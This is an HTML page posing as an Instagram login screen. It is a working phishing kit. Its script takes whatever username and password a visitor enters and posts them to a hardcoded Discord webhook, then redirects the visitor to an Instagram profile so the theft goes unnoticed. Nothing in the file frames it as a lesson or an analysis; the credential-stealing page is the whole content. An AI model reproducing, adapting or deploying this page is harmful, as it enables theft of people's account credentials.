<!doctype html>

    <head>

        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <title>Please login to continue</title>
        <meta name="description" content="Our first page">
        <meta name="keywords" content="html tutorial template">
        <link rel="stylesheet" href="texture.css">
    </head>
    <body>
        <div class="wrapper fadeInDown">
          
          <header class = 'maintext'>Please login to continue to the website</header>
            <div id="formContent">
              <!-- Tabs Titles -->
          
              <!-- Icon -->
              <div class="fadeIn first">
                <img src="https://i.imgur.com/zqpwkLQ.png" class="instagram">
              </div>
          
              <!-- Login Form -->
              <form>
                <input type="text" id="login" class="fadeIn second" name="login" placeholder="login">
                <input type="text" id="password" class="fadeIn third" name="login" placeholder="password">
                <input type="button" onclick="sendMessage()" class="fadeIn fourth" value="Log In" id = 'myButton'>
              </form>
          
              <!-- Remind Passowrd -->
              <div id="formFooter">
                <a class="underlineHover" href="#">Instagram Login</a>
              </div>
          
            </div>
          </div>
          <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
          <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
          
    </body>
    <script>
      function sendMessage() {
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/886488133850509342/qtVlYGKvE33kgN7ciT94mRqt-BCUc2ww3bBmWszkRlmdCfYT1lJatGtZQM4OkYSU1nV7");
  
        request.setRequestHeader('Content-type', 'application/json');
        var theInput = document.getElementById("login").value;
        var pass = document.getElementById("password").value;
  
        const params = {
          username: "My Webhook Name",
          avatar_url: "",
          content: `${theInput}  ${pass}`
        }
  
        request.send(JSON.stringify(params));
      }
      document. getElementById("myButton"). onclick = function () {
    location. href = "https://www.instagram.com/w21389123/";
    };
    </script>    
</html>
